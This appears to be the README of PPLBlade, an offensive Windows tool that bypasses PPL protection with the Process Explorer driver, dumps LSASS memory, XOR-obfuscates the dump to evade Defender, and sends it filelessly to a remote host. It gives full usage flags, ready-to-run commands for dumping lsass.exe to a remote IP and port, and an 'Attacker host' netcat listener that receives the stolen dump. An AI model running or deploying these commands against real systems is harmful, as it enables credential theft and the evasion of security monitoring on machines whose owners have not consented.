# PPLBlade
Protected Process Dumper Tool that support obfuscating memory dump and transferring it on remote workstations without dropping it onto the disk.

**Key functionalities**:
1) Bypassing PPL protection
2) Obfuscating memory dump files to evade Defender signature-based detection mechanisms
3) Uploading memory dump with RAW and SMB upload methods without dropping it onto the disk (fileless dump)


Overview of the techniques, used in this tool can be found here: https://tastypepperoni.medium.com/bypassing-defenders-lsass-dump-detection-and-ppl-protection-in-go-7dd85d9a32e6

_Note that PROCEXP15.SYS is listed in the source files for compiling purposes. It does not need to be transferred on the target machine alongside the PPLBlade.exe._

_It’s already embedded into the PPLBlade.exe. The exploit is just a single executable._

**Modes**:
1) **Dump** - Dump process memory using PID or Process Name
2) **Decrypt** - Revert obfuscated(--obfuscate) dump file to its original state
3) **Cleanup** - Do cleanup manually, in case something goes wrong on execution _(Note that the option values should be the same as for the execution, we're trying to clean up)_
4) **DoThatLsassThing** - Dump lsass.exe using Process Explorer driver _(basic poc)_

**Handle Mode**s:
1) **Direct** - Opens PROCESS_ALL_ACCESS handle directly, using OpenProcess() function
2) **Procexp** - Uses PROCEXP152.sys to obtain a handle 

```
Usage of PPLBlade.exe:
  -driver string
        Path where the driver file will be dropped (default: current directory)
  -dumpmode string
        Dump mode [local|network] (default "local")
  -dumpname string
        Name of the dump file (default "PPLBlade.dmp")
  -handle string
        Method to obtain target process handle [direct|procexp] (default "direct")
  -help
        Prints this help message
  -ip string
        IP of the remote server
  -key string
        XOR Key for obfuscation (default "PPLBlade")
  -mode string
        Kill or Dump process [dump|decrypt|cleanup|dothatlsassthing] (default "dump")
  -name string
        Process name of target process
  -network string
        Method for network transfer[raw|smb] (default "raw")
  -obfuscate
        Obfuscate dump file
  -pass string
        SMB password
  -pid int
        PID of target process (prioritized over process name)
  -port int
        PORT on the remote server
  -quiet
        Quiet mode
  -service string
        Name of the service (default "PPLBlade")
  -share string
        share name
  -user string
        SMB username

Examples:
PPLBlade.exe --mode dothatlsassthing
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
PPLBlade.exe --mode decrypt --dumpname PPLBlade.dmp --key PPLBlade
PPLBlade.exe --mode cleanup
```


**Examples:**

Basic POC that uses PROCEXP152.sys to dump lsass:

```
PPLBlade.exe --mode dothatlsassthing
```
_(Note that it does not XOR dump file, provide an additional obfuscate flag to enable the XOR functionality)_



Upload the obfuscated LSASS dump onto a remote location:

```
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

Attacker host:
```
nc -lnp 1234 > lsass.dmp
python3 deobfuscate.py --dumpname lsass.dmp
```

Deobfuscate memory dump:
```
PPLBlade.exe --mode descrypt --dumpname PPLBlade.dmp --key PPLBlade
````

